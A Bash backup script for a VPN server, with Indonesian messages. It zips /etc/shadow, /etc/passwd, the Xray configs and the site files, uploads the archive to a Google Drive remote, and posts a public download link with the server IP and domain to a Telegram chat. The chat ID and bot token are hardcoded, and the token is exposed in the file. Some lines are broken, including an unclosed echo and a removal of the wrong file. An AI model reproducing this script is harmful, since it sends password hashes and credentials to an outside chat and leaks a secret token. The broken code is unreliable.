#!/bin/bash
# SL
# ==========================================
# Color
RED='\033[0;31m'
NC='\033[0m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
LIGHT='\033[0;37m'
# ==========================================
# Getting
export CHATID="6800716979"
export KEY="6144661237:AAF-pZ4qPP_O8h1s0Y93QLvaIrksy7x-UI4"
export TIME="10"
export URL="https://api.telegram.org/bot$KEY/sendMessage"
clear
IP=$(wget -qO- ipinfo.io/ip);
date=$(date +"%Y-%m-%d-%H:%M:%S")
domain=$(cat /etc/xray/domain)
#clear
#email=$(cat /home/email)
#if [[ "$email" = "" ]]; then
#echo "Masukkan Email Untuk Menerima Backup"
#read -rp "Email : " -e email
#cat <<EOF>>/home/email
#$email
#EOF
#fi
clear
figlet "Backup"
echo "Mohon Menunggu , Proses Backup sedang berlangsung !!"
rm -rf /root/backup
mkdir /root/backup
cp /etc/passwd backup/
cp /etc/group backup/
cp /etc/shadow backup/
cp /etc/gshadow backup/
cp -r /etc/xray backup/xray
cp -r /root/nsdomain backup/nsdomain
cp -r /etc/slowdns backup/slowdns
cp -r /home/vps/public_html backup/public_html
cd /root
zip -r $IP-$date-$domain-vergil.zip backup > /dev/null 2>&1
rclone copy /root/$IP-$date-$domain-vergil.zip dr:backup/
url=$(rclone link dr:backup/$IP-$date-$domain-vergil.zip)
id=(`echo $url | grep '^https' | cut -d'=' -f2`)
link="https://drive.google.com/u/4/uc?id=${id}&export=download"
echo -e "
echo -e "
Detail Backup 
==================================
IP VPS        : $IP
Link Backup   : $link
Tanggal       : $date
==================================
" | mail -s "Backup Data" $email
rm -rf /root/backup
rm -r /root/$IP-$date.zip
clear
CHATID="$CHATID"
KEY="$KEY"
TIME="$TIME"
URL="$URL"
TEXT="<code>-----------------------</code>
<code>Detail Backup </code>
<code>-----------------------</code>
<code>DOMAIN       : ${domain}</code>
<code>-----------------------</code>
<code>IP VPS       : ${IP}</code>
<code>-----------------------</code>
<code>Link Backup   :</code> $link
<code>-----------------------</code>
<code>Tanggal : $date</code>
<code>-----------------------</code>
"

curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
echo ""
clear
echo -e "
Detail Backup 
==================================
IP VPS        : $IP
Link Backup   : $link
Tanggal       : $date
==================================
"
echo "Silahkan copy Link dan restore di VPS baru"
echo ""
